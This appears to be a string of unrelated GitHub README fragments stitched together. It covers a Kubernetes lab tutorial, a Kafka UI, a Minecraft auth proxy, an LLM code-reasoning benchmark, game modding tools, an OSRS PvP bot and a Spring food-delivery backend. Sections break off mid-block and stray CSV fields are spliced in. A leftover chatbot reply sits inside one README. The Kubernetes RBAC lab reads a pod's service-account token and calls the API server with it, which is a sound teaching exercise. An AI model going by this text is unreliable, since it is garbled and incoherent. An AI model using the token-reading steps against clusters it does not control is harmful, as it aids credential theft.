```shell
cd /on-startup/

sh run.sh
```

Application is running on port `8080` for backend and `8081` for event handler.

You can access endpoints and make requests to the application.

## Kubernetes  Guides

### Networking

The purpose of [this website](https://www.tkng.io/) is to provide an overview of various Kubernetes networking components with a specific focus on exactly how they implement the required functionality.

The guide is split into multiple parts which can be studied mostly independently, however they all work together to provide a complete end-to-end cluster network abstractions.

Where possible, every topic in this guide will include a dedicated [hands-on labs](https://www.tkng.io/lab/) which can be spun up locally in a matter of minutes. 

### Security

### Kubernetes Secrets are not secret

Secrets are resources containing keys with base64 encoded values. Secrets are not encrypted by default, they are only encoded and can get decoded easily by everyone who has access to a namespace or to the whole cluster.

Secret values can be exposed to pods as environment variables or mounted as files.

In order to create a secret from a text file, you can run the following, This creates a generic secret named secretname and automatically encodes the value as base64:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
echo -n ""yourvalue"" > ./secret.txt
k create secret generic secretname --from-file=./secret.txt
k describe secrets secretname
k get secret secretname -o yaml
echo 'eW91cnZhbHVl' | base64 --decode
# or
k create secret generic mysecret --dry-run -o yaml --from-file=./secret.txt > secret.yaml
k create -f secret.yaml
# or
k create secret generic mysecret --dry-run -o yaml --from-literal=secret.txt=yourvalue > secret.yaml
```
</p>
</details>

### Kubernetes ConfigMaps

A ConfigMap is an object consisting of key-value pairs which can be injected into your application.

With a ConfigMap you can separate configuration from your Pods. This way, you can prevent hardcoding configuration data.

ConfigMaps are useful for storing and sharing non-sensitive, unencrypted configuration information. Sensitive information should be stored in a Secret instead.

Exercise:

Create a ConfigMap named kubernauts that contains a key named dev with the value ops.

With the --from-literal argument passed to the k create configmap command you can create a ConfigMap containing a text value.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k create cm kubernauts --from-literal=dev=ops --dry-run -o yaml > cm-kubernauts.yaml
cat cm-kubernauts.yaml
echo -n ""ops"" > dev
k create cm kubernauts --from-file=./dev
k get cm
k describe cm kubernauts
k delete cm kubernauts
k create -f cm-kubernauts.yaml
k describe cm kubernauts
```
</p>
</details>

Using this ConfigMap, we can inject data in our application:

## Whoami, Whoareyou and Whereami Problems

### What We‚Äôll Do

We‚Äôll use a pre-made container ‚Äî containous/whoami ‚Äî capable of telling you where it is hosted and what it receives when you call it.

If you'd like to build the container image with docker, do:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
git clone https://github.com/containous/whoami.git
docker build -t whoami .
docker tag whoami kubernautslabs/whoami
docker push kubernautslabs/whoami
docker images | head
```

</p>
</details>

We‚Äôll define two different deployments, a whoami and a whoareyou deployment that will use `containous/whoami` container image.

We‚Äôll create a deployment to ask Kubernetes to deploy 2 replicas of whoami and 3 replicas of whoareyou.

We‚Äôll define two services, one for each of our Pods.

We‚Äôll define Ingress objects to define the routes to our services to the outside world.

We‚Äôll use our Nginx Ingress Controller on our Rancher Cluster.

Explanations about the file content of whoami-deployment.yaml:

We define a ‚Äúdeployment‚Äù (kind: Deployment)

The name of the object is ‚Äúwhoami-deployment‚Äù (name: whoami-deployment)

We want two replica (replicas: 2)

It will deploy pods that have the label app:whoami (selector: matchLabels: app:whoami)

Then we define the pods with the (template: ‚Ä¶) which will have the whoami label (metadata:labels:app:whoami)

The Pods will host a container using the image containous/whoami (image:containous/whoami)

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k apply -f 1-whoami-deployment.yaml
k get all
# we expose the deployment with a service of type ClusterIP
k create -f 1-whoami-service-ClusterIP.yaml
k get svc
k port-forward service/whoami-service 8080:80
# in a new terminal session call
curl 127.0.0.1:8080
k delete svc whoami-service
# create a service of type NodePort
k create -f 1-whoami-service-nodeport.yaml
k get svc
curl csky08:30056 # adapt the nodeport for your env. please !
curl csky09:30056
curl csky10:30056
k delete svc whoami-service-nodeport
k create -f 1-whoami-service-loadbalancer.yaml
k get svc
curl <EXTERNAL-IP> # the external-ip is given from the LB IP pool above
k create -f 2-whoareyou-all.yml
k get all
k get svc
k get ing
curl <HOSTS value from ingress>
# are you happy? ;-)

## DNS based Service discovery with whereami kubia pod

### What We‚Äôll Do

We'll use a slightly extended node.js app (which is a simple web server) from the [Kubernetes in Action book by Marko Luk≈°a](https://www.amazon.com/-/en/Marko-Luksa/dp/1617293725) in 2 different namespaces ns1 and ns2 to demonstrate the DNS based services discovery. 

A service provides a Virtual IP (VIP) address, which means the Service IP is not bound to a physical network interface. A service acts like an internal loadbalancer in K8s! The magic of of routing trafic through the VIP is implemented by IPtable rules managed by kube-proxy!

A service can be called through its FQDN in the form of:

`$SERVICE_NAME.$NAMESPACE.svc.cluster.local`

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cd whereami
k create ns ns1
k create ns ns2
kn ns1
cat kubia-deployment.yaml   
k create -f kubia-deployment.yaml
k create -f kubia-deployment.yaml -n ns2
k expose deployment kubia
k get svc
k expose deployment kubia -n ns2
k get svc -n ns2
k exec -it kubia-<press tab> -- curl kubia.ns2.svc.cluster.local:8080
k scale deployment kubia -n ns2 --replicas 3
# repeat the service call many times and see how loadbalancing works
k exec -it kubia-<press tab> -- curl kubia.ns2.svc.cluster.local:8080
k exec -n ns2 -it kubia-<press tab> -- curl kubia.ns1.svc.cluster.local:8080
k exec -it kubia-<press tab> -- ping kubia.ns2.svc.cluster.local
--> PING kubia.ns2.svc.cluster.local (10.43.109.89) 56(84) bytes of data.
# you don't get any pong, why?
# ssh into a node and examine the IPtable rules
sudo iptables-save | grep kubia
```
</p>
</details>

### Headless Services for Stickiness

![hadless](images/headless-cluster-ip.png ""headless-cluster-ip"")

As we learned services are exposed by default through the type ClusterIP, they work as an internal layer 4 load-balancer and provide a VIP with a stable DNS address, where the clients can connect to. The service forwards the connections to one of the pods which are backing the service via round robin.

This works fine and is desired for stateless apps which need to connect to one of the pods randomly and gain more performance through trafic routing via load balancing.

But in some cases where stickiness is needed and the clients need to connect to a particular pod for session or data stickiness, then we need to define our service without ClusterIP, which is by default the head of the service (that's the VIP).

To do that we need to define our service as a `headless` service, let's see that in action with the whereami service and our utils pod.

In the following we expose the kubia deployment as a headless service by setting the ClusterIP to `None`, scale the deployment and do a DNS query to both services with `host kubia-headless` and `host kubia-clusterip` from within the util client pod. As you'll see our client pod always connects to the first IP from the DNS response, if we curl the headless service. This means no load balancing happens, the call is `Sticky`!

The second curl to the service with ClusterIP does load balancing and distributes the traffic between pods.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k delete svc kubia
k expose deployment kubia --name kubia-headless --cluster-ip None
k expose deployment kubia --name kubia-clusterip
k expose deployment kubia --name kubia-lb --type=LoadBalancer
k scale deployment kubia --replicas 3
k run --generator=run-pod/v1 utils -it --image kubernautslabs/utils -- bash
# inside the utils container
host kubia-headless
host kubia-clusterip
# what is the difference here?
for i in $(seq 1 10) ; do curl kubia-headless:8080; done
# hits kubia only on one node? 
for i in $(seq 1 10) ; do curl kubia-clusterip:8080; done
# does load balancing via the head ;-)
exit
mkcert '*.whereami.svc'
k create secret tls whereami-secret --cert=_wildcard.whereami.svc.pem --key=_wildcard.whereami.svc-key.pem
cat kubia-ingress-tls.yaml
k create -f kubia-ingress-tls.yaml
# Please provide the host entry mapping in your /etc/hosts file like this:
# 192.168.64.23 my.whereami.svc
# the IP should be the IP of the traefik loadbalancer / ingress controller
curl https://my.whereami.svc
for i in $(seq 1 10) ; do curl https://my.whereami.svc; done
# the ingress controller does load balancing, although the kubia-headless is defined as the backend with serviceName: kubia-headless!
```

</p>
</details>

## Ingress with TLS

![ingress-controller](images/ingress-controller-traefik.png ""ingress-controller-traefik"")

Often we need to use an ingress object to provide path based or (sub-) domain based routing with TLS termination and other capabilities defined through annotations in the ingress resource.

By creating an ingress for a service, the ingress controller will create a single entry-point to the defined service in the ingress resource on every node in the cluster.

In the follwoing we're using the traefik ingress controller and an ingress object to provide path based or (sub-) domain based routing with TLS termination with a valid mkcert made TLS certificate on our lab environment.


<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cd ..
kn default
mkcert '*.ghost.svc'
k create secret tls ghost-secret --cert=_wildcard.ghost.svc.pem --key=_wildcard.ghost.svc-key.pem
# alternatively, if you can't or you don't want to use mkcert, you can create a selfsigned cert with:
# openssl genrsa -out tls.key 2048
# openssl req -new -x509 -key tls.key -out tls.cert -days 360 -subj /CN=my.ghost.svc
# k create secret tls ghost-secret --cert=tls.cert --key=tls.key
cat 3-ghost-deployment.yaml
k create -f 3-ghost-deployment.yaml
k expose deployment ghost --port=2368
cat 3-ghost-ingress-tls.yaml
k create -f 3-ghost-ingress-tls.yaml
# Please provide the host entry mapping in your /etc/hosts file like this:
# 192.168.64.23 my.ghost.svc admin.ghost.svc
# the IP should be the IP of the traefik loadbalancer / ingress controller
open https://my.ghost.svc
open https://admin.ghost.svc/ghost
# change the service type to LoadBalancer and access ghost with the loadbalancer IP on port 2368 or on any other node (works on k3s with trafik only), e.g.:
open http://node2:2368
# scale the deployment to have 2 replicas and see how the backend ghost backened https://admin.ghost.svc/ghost doesn't work.
```

</p>
</details>

## Multi-Container Pods

Create a Pod with two containers, both with image alpine and command ""echo hello; sleep 3600"". Connect to the second container and run 'ls'.

The easiest way to do it is to create a pod with a single container and save its definition in a YAML file and extend it with an additional container:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k run alpine-2-containers --image=alpine --restart=Never -o yaml --dry-run -- /bin/sh -c 'echo hello;sleep 3600' > alpine-pod.yaml
```

Copy/paste the container related values, so your final YAML should contain the following two containers (make sure those containers have a different name):

```YAML
containers:
  - args:
    - /bin/sh
    - -c
    - echo hello;sleep 3600
    image: alpine
    name: alpine1
    resources: {}
  - args:
    - /bin/sh
    - -c
    - echo hello;sleep 3600
    image: alpine
    name: alpine2
    resources: {}
```

```yaml
k create -f alpine-pod-2-containers.yaml # alpine-pod-2-containers.yaml is in this repo
# exec / ssh into to the alpine2 container
k exec -it alpine-2-containers -c alpine2 -- sh
ls
exit

# or just an one-liner
k exec -it alpine2 -c alpine2 -- ls

# cleanup
k delete pod alpine-2-containers
```

</p>
</details>


### Shared Volume

We'll extend the above alpine-2-containers with a shared volume of type emptyDir named `share` with a volumeMount for each container with a mountPath `/tmp/share1` and `/tmp/share2` as follow:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cat alpine-pod-share-volumes.yaml
k apply -f alpine-pod-share-volumes.yaml
k exec -it alpine-2-containers-share-volume -c alpine1 -- sh
touch /tmp/share1/sharefile
echo ""test-share1"" > /tmp/share1/sharefile
cat /tmp/share1/sharefile
exit
k exec -it alpine-2-containers-share-volume -c alpine2 -- cat /tmp/share2/sharefile
```

</p>
</details>

## Security

Kubernetes Security is a huge topic and security hardening is a nice problem which everyone has to implement according to their security requirements and the governance model of their organization. We're going only to scratch the surface of K8s security here and highly recommend to go through the following resources by Michael Hausenblas, Liz Rice and the community.

https://kubernetes-security.info/

https://learn.hashicorp.com/vault/getting-started-k8s/sidecar

https://github.com/k8s-sec/k8s-sec.github.io


### Service Accounts

In K8s each namespace has a default ServiceAccount, named `default`. A ServiceAccount is a namespaced resource used by containers running in a Pod, to communicate with the API server of the Kubernetes cluster. ServiceAccounts with limited permissions are often used to apply the principle of least priviledge.

```bash
k get sa --all-namespaces | grep default
k get sa default -o yaml
k get secret default-<press tab> -o yaml
```

The data key of this Secret has several key/pairs:

```yaml
apiVersion: v1
kind: Secret
data:
  ca.crt: LS0tLS1CRUdJTi...
  namespace: ZGVmYXVsdA==
  token: ZXlKaGJHY2lP...
metadata:
  annotations:
    kubernetes.io/service-account.name: default
...
```

The token is the Base64 encoding of the JWT used to authenticate against the API server.
Let's get the token and head to jwt.io and use the debugger to decode the token.

```bash
kubectl run -it alpine --restart=Never --image=alpine -- sh
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
exit
open https://jwt.io/
```

Paste the token and get the payload, which looks similar to this:

```
{
  ""iss"": ""kubernetes/serviceaccount"",
  ""kubernetes.io/serviceaccount/namespace"": ""default"",
  ""kubernetes.io/serviceaccount/secret.name"": ""default-token-24pbl"",
  ""kubernetes.io/serviceaccount/service-account.name"": ""default"",
  ""kubernetes.io/serviceaccount/service-account.uid"": ""147e134a-43d0-4c76-ad01-bccc59f8acb9"",
  ""sub"": ""system:serviceaccount:default:default""
}
```

We can see the service account default is linked to the namespace where it exists and is using the secret default-token-24pbl. This token is available in the filesystem of each container of the Pod of the attached ServiceAccount.

### Using a Custom ServiceAccount

A Service Account on its own is on not so useful, we need to provide rome rights and permissions to it through a set of rules defined through roles or cluster roles using the RBAC implementation in K8s.  


### RBAC (Role Based Access Control)

RBAC in K8s is activated by default and helps to provide access to resources (objects) like namespaces, pods, services, etc. to those Subjects or Entities like users, group or service accounts who need access to some resources and deny access to other resources who do not need access to them. RBAC increases security in K8s projects and shall be defined through a governance model in each organization (but in the theorie, you know we are all admins ;-)).

RBAC is implemented through Role, ClusterRole, RoleBinding, and ClusterRoleBinding.

#### Role

A Role defines what you or a subject can do to a set of resources, like get, set, delete, etc.A Role contains a set of rules which define a set of permissions. Roles are used to assigning permissions to resources on the namespace level.

#### ClusterRole

Similar to Role, ClusterRole can grant permissions on the Cluster Level such as giving resource permissions across all namespaces in the cluster.

#### RoleBinding and ClusterRoleBinding

RoleBinding and ClusterRoleBinding are used to grant permissions and priviledges to Subjects or Entities on the namespace (project RoleBinding) level or on the cluster level (ClusterRoleBinding).

![RBAC](images/rbac.png ""rbac"")

#### What We‚Äôll Do

We create a new namespace myapp and a new custom ServiceAccount `mysa`, create a new role `podreader` with the permission to get and list pods and create a rolebinding `mypodviewer` to bind the ServiceAccount to the role podreader in the namespace `myapp`.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k get clusterroles | wc -l
# 62
k get clusterroles
k describe clusterrole view
k describe clusterrole view | grep pods
# the view role allows your application access to many other resources such as deployments and services.
k create namespace myapp
k -n=myapp create serviceaccount mysa
k -n myapp create role podreader --verb=get --verb=list --resource=pods
k -n myapp describe role/podreader
# nice, the role podreader can only view now, but we need to attach the role podreader to our application, represented by the service account myapp. 
k -n myapp create rolebinding mypodviewer --role=podreader --serviceaccount=myapp:mysa
k -n myapp describe rolebindings mypodviewer
k -n myapp auth can-i --as=system:serviceaccount:myapp:mysa list pods
# yes :-)
k -n myapp auth can-i --as=system:serviceaccount:myapp:mysa list services
# no :-)
```
</p>
</details>

We extend our alpine pod with the key `serviceAccountName` and the value `mysa`, apply the change and run a shell in the alpine-pod, get the toke belonging to the `mysa` ServiceAccountand use it to list the pods in the default namespace and the myapp namespace to see the differences:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml

kn myapp
cat alpine-pod-service-account.yaml
k apply -f alpine-pod-service-account.yaml
k describe pod alpine-sa
k get sa
k get secrets
k exec -it alpine-sa -- sh
apk add curl
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
curl -H ""Authorization: Bearer $TOKEN"" https://node1:6443/api/v1/namespaces/default/pods/ --insecure
curl -H ""Authorization: Bearer $TOKEN"" https://node1:6443/api/v1/namespaces/myapp/pods/ --insecure
# what works, what doesn't work?

```

# Day 2 Operation

Day 2 operation is mainly about implementing some principles like selfhealing and autoscaling for our apps AND the infrastructure components like nodes and K8s components itself and define resources limits, liveness and readiness probes for our apps, run continious security auditing, apply GitOps principles and style, etc.

In this first section we'll go through app auto scaling with Horizontal Pod Autoscaler.

![hpa](images/pod-autoscaling-hpa.png ""hap"")

## Pod AutoScaling with HPA (Horizontal Pod Autoscaler)

```bash
kubectl run hpa-example --image=k8s.gcr.io/hpa-example --requests=cpu=200m --expose --port=80
# create HPA based on CPU usage
kubectl autoscale deployment hpa-example --cpu-percent=50 --min=1 --max=10
# In another terminal run
kubectl run -i --tty generate-load --image=busybox /bin/sh
# Inside the above container run a loop bash command to stress the CPU
while true; do wget -q -O- http://hpa-example.default.svc.cluster.local; done
# Check HPA Status
kubectl get hpa
```

# The Interface
Kafbat UI wraps major functions of Apache Kafka with an intuitive user interface.

![Interface](documentation/images/Interface.gif)

## Topics
Kafbat UI makes it easy for you to create topics in your browser by several clicks,
pasting your own parameters, and viewing topics in the list.

![Create Topic](documentation/images/Create_topic_kafka-ui.gif)

It's possible to jump from connectors view to corresponding topics and from a topic to consumers (back and forth) for more convenient navigation.
connectors, overview topic settings.

![Connector_Topic_Consumer](documentation/images/Connector_Topic_Consumer.gif)

### Messages
Let's say we want to produce messages for our topic. With the Kafbat UI we can send or write data/messages to the Kafka topics without effort by specifying parameters, and viewing messages in the list.

![Produce Message](documentation/images/Create_message_kafka-ui.gif)

## Schema registry
There are 3 supported types of schemas: Avro¬Æ, JSON Schema, and Protobuf schemas.

![Create Schema Registry](documentation/images/Create_schema.gif)

Before producing avro/protobuf encoded messages, you have to add a schema for the topic in Schema Registry. Now all these steps are easy to do
with a few clicks in a user-friendly interface.

![Avro Schema Topic](documentation/images/Schema_Topic.gif)

</details>

# Getting Started

To run Kafbat UI, you can use either a pre-built Docker image or build it (or a jar file) yourself.

## Quick start (Demo run)

```
docker run -it -p 8080:8080 -e DYNAMIC_CONFIG_ENABLED=true ghcr.io/kafbat/kafka-ui
```

Then access the web UI at [http://localhost:8080](http://localhost:8080)

The command is sufficient to try things out. When you're done trying things out, you can proceed with a [persistent installation](https://ui.docs.kafbat.io/quick-start/persistent-start)

## Persistent installation

```
services:
  kafbat-ui:

# **BungeeAuthProxy**

Authentication proxy injector for BungeeCord servers,
which is trying to solve the problem of inability to access the MineCraft online session and auth service in some areas.

## Usage

**Before using this injector, make sure that your Java version is 11 or above.**

1. Download latest release from [here](https://github.com/ArtformGames/BungeeAuthProxy/releases) .
2. Put the jar file into the folder of your BungeeCord server (same path with server jar).
3. Add the `-javaagent:BungeeAuthProxy.jar[=<CONFIG-FILE-NAME>]` before `-jar <server-jar>.jar` to the start command of
   your BungeeCord server.
    - For example: `java -javaagent:BungeeAuthProxy.jar -jar BungeeCord.jar`
    - Using custom config file name: `java -javaagent:BungeeAuthProxy.jar=auth-proxy.yml -jar BungeeCord.jar`
4. Start your bungeecord server, and configured the proxy (Default is `auth.yml` in server folder).

## Configurations

Will be generated on the first boot up.

```yaml
debug: false

# MineCraft service settings
service:
  # Timeout duration for single request in milliseconds.
  time-out: 5000
  # Authentication url dns-cache expire duration in milliseconds
  # If this value ‚â§0, will disable dns-cache.
  dns-cache-expire: 60000

# Proxy server settings
proxy:
  # Proxy protocol, -1 = NO_PROXY ,0 = HTTP/HTTPS, 1 = SOCKS4, 2 = SOCKS5
  protocol: -1
  # Proxy host
  host: 127.0.0.1
  # Proxy port
  port: 7890
  # Proxy authentication settings
  auth:
    # Whether to enable proxy authentication
    enabled: false
    username: proxy-username
    password: proxy-password

## CodeMind Framework
<img src=""https://github.com/Intelligent-CAT-Lab/CodeMind/blob/main/CodeMind-Logo.jpg"" width=""20%"" height=""20%"" align=""right""/> Solely relying on test passing to evaluate Large Language Models (LLMs) for code synthesis may result in unfair assessment or promoting models with data leakage. As an alternative, we introduce CodeMind, a framework designed to gauge the code reasoning abilities of LLMs. CodeMind currently supports three inductive code reasoning tasks: (1) Independent Execution Reasoning (IER), Dependent Execution Reasoning (DER), and Specification Reasoning (SR). Please follow the instructions below to reproduce the results to use existing models, tasks, and datasets. We also support adding new models, tasks, and datasets. 

### Dependencies
<!--Deployment and use of CodeMind require specific dependencies.--> <!--Please check if all dependencies listed on ```requirements.txt``` are installed in your environment.-->
To install all the dependencies, run the following command: ```pip install -r requirements.txt```

CodeMind is designed to read API keys required for API-access models from local variables. Please modify and run ```setup.sh {OPANAIKEY}``` to automatically add the variable to your local machines.


### How to reproduce the results

```
```SR_TYPE```: can be 'no_test', 'with_test' or 'misleading_test'

### How to Add New Models
You have two options to evaluate a new model using CodeMind:

Option 1: Open an issue on the repo's issue tracker and label it with ""new_model."" We will resolve the issue by adding the new model per each ""new_model"" request. 

Option 2: You can modify the ""model_config.json"" by adding properties of the new model, such as model ID and interface type. You should also modify ""create_prompt_ier.py"" and ""reate_prompt_der.py"" scripts, as different models may require additional information in the prompt that is currently not supported by our scripts. 

### How to Add New Reasoning Tasks
To add a new reasoning task to CodeMind, please open an issue on the repo's issue tracker and label it with ""new_task."" We will provide additional information about how to integrate your new reasoning tasks into CodeMind.  

<!--To add a new task, create a directory in the ```DER/``` directory with the name of the task. Please upload all your scripts and add a README under your directory to explain how to run the scripts.
Note that please include a script to process your raw output into the data format required by the IER:
```
+---Task
    |
    +--Problem_1
       |
        +--input.txt
       |  |
       |  +--ouptut.txt
       |  |
       |  +--main.py/Main.java/etc.
       |
       +--Problem_2
       |
```
Create a folder for each ""problem"" and add the code(main.py, Main.java, etc.), the input (input.txt) and the ground-truth output(output.txt) under the folder.
Also create a directory in the ```dataset``` with the name of the task and upload the processed dataset under this directory. For example, all the passing translated code generated by LLMs can be found under ```dataset/Translation```-->


### How to Add New Dataset
<!--Please visit the ```/Dataset``` directory for the latest version of benchmarks integrated with CodeMins.-->
Datasets are stored under the ```/Dataset``` directory. If a dataset contains instances from different programming languages, they should be separated into separate sub-directories (similar to the structure below). 
```
+---Avatar
|   |
|   +---Avatar-java
|   |
|   +---Avatar-python
|
+---CodeNet
|   |
|   +---CodeNet-java
|   |
|   +---CodeNet-python
|
+---CRUXEval
|
+---HumanEval
|
+---MBPP
```
Given that different datasets read test data differently, please open an issue on the repo's issue tracker to add a new dataset to CodeMind.

SMGCommunity/Whitehole-Neo,master,"# Whitehole Neo
![Editing Flip-Swap Galaxy](https://github.com/SMGCommunity/Whitehole-Neo/blob/master/ExampleImage.png)
**Whitehole Neo** is a rewrite of *Whitehole*, a level editor for *Super Mario Galaxy* and *Super Mario Galaxy 2* that is over 10 years old.
This goal with this version is to make the program more stable and to be properly maintained.
It removes a lot of unused code and broken features that were introduced between versions 1.4 through 1.7, and improves on Despaghettification.
Several outdated or questionable parts of the code have been upgraded, but there's still a lot more waiting to be improved.
Major new additions include support for the [new object database](https://github.com/SMGCommunity/galaxydatabase), simple galaxy names that are displayed on the main window, a completely new Light Mode and Dark Mode UI, The ability to Undo actions, and Copy & Paste for objects.
It is also fully compatible with all of SMG1's stages. Tons of bugs introduced in older versions of Whitehole have been fixed as well.

This is intended for Java 11, though the program runs fine on newer Java versions as well, but requires the tool to be started using this command: ```java --add-exports=java.desktop/sun.awt=ALL-UNNAMED -jar Whitehole.jar```.<br/>Alternatively, run the included `.bat` file

## Controls

Naton1/osrs-pvp-reinforcement-learning,master,"# OSRS PvP Reinforcement Learning

This project leverages deep reinforcement learning, specifically [PPO](https://arxiv.org/pdf/1707.06347.pdf), and
self-play techniques to develop an AI agent capable of mastering 'no honor' player versus player fights
in [Old School RuneScape (OSRS)](https://oldschool.runescape.com/) (such as in Last Man Standing).

**Project Components:**

1. [ML Training System](#pvp-ml)
2. [Game Simulation](#simulation-rsps)

The training system launches and manages the simulation when training, though the simulation can be run on its own too.
The training system also contains an API to serve trained models.

**Note**: A third component for evaluating the models in the live game as a third-party client plugin was developed but
is not publicly available to prevent affecting the real game.

### Showcase

The most recent model version shows incredibly promising results. [FineTunedNh](pvp-ml/models) maintained a
near perfect win rate on the real game in LMS, primarily losing only due to the inherent randomness of the game.

</details>

# How To Use

1. Clone the repository: `git clone https://github.com/Naton1/osrs-pvp-reinforcement-learning`.
2. Follow the README in each of the two subprojects to set up each project individually.

By following these steps, you'll be able to set up the environment and start training your own AI agent. You'll also
be able to serve the pre-trained models via an API.

## [PvP ML](pvp-ml)

This Python-based component encompasses the core machine learning system. It's the primary interface for training,
orchestrating the entire training workflow, and facilitating connections to the simulation RSPS for training
sessions. The system also includes a socket-based API for real-time predictions.

## [Simulation RSPS](simulation-rsps)

The Simulation RSPS project provides a platform for conducting simulated PvP fights, enhancing the training efficiency
of the agent. It's built on top of a pre-existing private server: [Elvarg RSPS](https://github.com/RSPSApp/elvarg-rsps).

### [Environment Contracts](contracts)

Environment contracts are defined in [contracts/environments](contracts/environments), using JSON files that
describe the actions and observations within each environment. These contracts are used by the two components listed
above.

#### Existing Environment Contracts

* [NH Environment](contracts/environments/NhEnv.json): The primary environment for this project
* [Dharok Edge-Style Environment](contracts/environments/DharokEnv.json): A test environment, partially implemented.

## Train Custom Model

You can train a customized model on the simulation for any defined environment. To train on a new environment, you
can add one ([see below](#add-new-environment)).

Experiment parameters are defined in a YAML file. There are several provided configurations. These configurations
can be customized to produce train new and unique models.

See [start a training job](pvp-ml/README.md#start-training-job) for more detailed
information.

### Add New Environment

You can define a new environment in addition to the pre-existing environments. Use the already-implemented environments
as a reference.

1) Implement the environment contract at [contracts/environments](contracts/environments).
2) Follow the [simulation steps to add a new environment](simulation-rsps/README.md#add-new-environment).
3) Create or update [a training configuration](pvp-ml/config) to use the new environment by setting `env-name`.

## Use Existing Models

To use an existing model via API:

1. Set up the [pvp-ml project](pvp-ml/README.md#how-to-use).
2. Run the [pvp-ml API](pvp-ml/README.md#serve-models-via-api).

## Evaluate Trained Models

To play against the trained models on the simulation:

1. Set up the [pvp-ml project](pvp-ml/README.md#how-to-use).
2. Set up the [simulation-rsps](simulation-rsps/README.md#how-to-use) project and start the server.
3. Start up a RSPS client and [connect to the server](simulation-rsps/README.md#connect-to-server-via-client).
4. Start an [agent evaluation session](pvp-ml/README.md#evaluate-model-on-simulation) for the model.",0,0,1,,test.yml,0.0

mt1006/mc-ar-mod,FABRIC-1.20.1,"### This mod (especially in its current state) is more of a proof of concept than actual optimization mod!
It has many issues and greatly reduces performance of main rendering thread (even when disabled),
so for comparing performance use instance without mod installed.

# About
**Asynchronous Reprojection** is a Minecraft mod that creates second rendering context to asynchronously reproject frames from main rendering thread with new camera rotation and player position.

It was inspired by Comrade Stinger's demo, which was also base for shader code:
https://www.youtube.com/watch?v=VvFyOFacljg

Known issues:
- Fabric version works only on Windows and Linux (I haven't tested it on macos). Forge version works only on Windows.
- Screenshots (F2) and world icons don't work - they're black.
- Minor visual glitches.
- Camera bobbing is disabled.
- ""Fabulous"" graphics doesn't change anything compared to ""Fancy"".
- Camera sometimes rotates itself when opening or closing GUI.
- Forge version crashes when trying to resize window during startup.
- It sometimes just crashes (for no particular reason).

Missuo0o/FoodDeliveryBackend,main,"# Food Delivery Backend System

This is the backend system for a food delivery application, built using Spring Boot. The application leverages a range of technologies including MySQL, Redis, RabbitMQ, and integrates with Alibaba Cloud's OSS and WeChat Pay. This system is designed to be scalable, secure, and efficient, utilizing Spring Boot's extensive support for enterprise-grade applications.

## Configuration

The application is configured to run on port 8080 and is set up with production profiles. It uses MyBatis for ORM, JWT for authentication, and includes advanced logging configurations.

### Technologies Used

- **Spring Boot** - Framework for building Java-based applications.
- **MySQL** - Database for storing user and order data.
- **Redis** - Used as a cache and session store.
- **RabbitMQ** - Messaging broker for handling asynchronous processing.
- **JWT** - For securing REST APIs by providing tokens to verify user identity.
- **MyBatis** - Persistence framework integrating with Spring Boot for data handling.
- **Knife4j** - Enhanced Swagger-compatible interface for visualizing RESTful APIs.
- **Alibaba Cloud OSS** - For storage solutions.
- **WeChat Pay** - Payment integration for handling transactions and refunds.

## Installation

### Prerequisites

You need the following installed on your system:

- Java JDK 23
- Maven
- MySQL
- RabbitMQ
- Redis

### Setup

1. Clone the repository:

   ```bash
   git clone https://github.com/yourusername/food-delivery-backend.git
   ```

2. Navigate to the project directory:

   ```bash
   cd food-delivery-backend
   ```

3. Install dependencies:

   ```bash
   mvn install
   ```

### Configuration

Update the `application.yml` or `application.properties` with your specific settings for MySQL, Redis, RabbitMQ, OSS, and WeChat Pay. This typically includes hosts, ports, usernames, passwords, and other essential configuration details.

Certainly! Here's the section of the README updated to reflect how to run the application using the `java -jar` command instead of Maven directly:

---

## Running the Application

Instead of using Maven to run the application, you can build a jar file and run it directly using the Java command. This is often more suitable for production environments or when deploying the application.

1. First, package the application into a runnable jar file with Maven:

   ```bash
   mvn clean package
   ```

   This command will create a `.jar` file in the `target` directory.

2. Run the application using:

   ```bash
   java -jar target/your-application-name.jar
   ```

   Replace `your-application-name.jar` with the actual name of your jar file generated by Maven.

The application will start running on `http://localhost:8080`.

---

## API Documentation

API documentation is available via Swagger UI and Knife4j at:

- **Swagger UI**: [http://localhost:8080/swagger-ui.html](http://localhost:8080/swagger-ui.html)
- **Knife4j**: [http://localhost:8080/doc.html](http://localhost:8080/doc.html)

## Security

This application uses JWT for authentication. Ensure you configure your JWT settings properly, including secret keys and token names for both admin and user levels.

## Contributing

We appreciate contributions. Please follow the standard GitHub fork-and-pull-request workflow.

2. CacheTemplate adds new custom methods

MyCacheTemplate.java

```java
import org.codeba.redis.keeper.support.CacheKeeperConfig;
import org.codeba.redis.keeper.support.DefaultRedissonTemplate;

public class MyCacheTemplate extends DefaultRedissonTemplate implements CacheTemplate {

    public MyCacheTemplate(CacheKeeperConfig cacheKeeperConfig) {
        super(cacheKeeperConfig);
    }

    public void test() {
	    final RedissonClient redissonClient = getDataSource();
        redissonClient.someMehotd();
        System.out.println(""hello world"");
    }

}
```

MyCacheDatasource.java

```java
import org.codeba.redis.keeper.support.CacheDatasource;
import org.codeba.redis.keeper.support.CacheKeeperConfig;

public class MyCacheDatasource implements CacheDatasource<MyCacheTemplate> {

    @Override
    public MyCacheTemplate instantTemplate(CacheKeeperConfig config) {
        return new MyCacheTemplate(config);
    }

}
```

Enabling the new MyCacheDatasource

```java
import org.codeba.redis.keeper.support.CacheDatasource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class MyConfiguration {

    @Bean
    public CacheDatasource<MyCacheTemplate> cacheDatasource() {
        return new MyCacheDatasource();
    }

}
```

3. Enabling the new CacheTemplate

```java
@SpringBootTest
public class AppTest {

    @Autowired
    private CacheTemplateProvider<MyCacheTemplate> myProvider;

    @Test
    public void testMyProvider() {
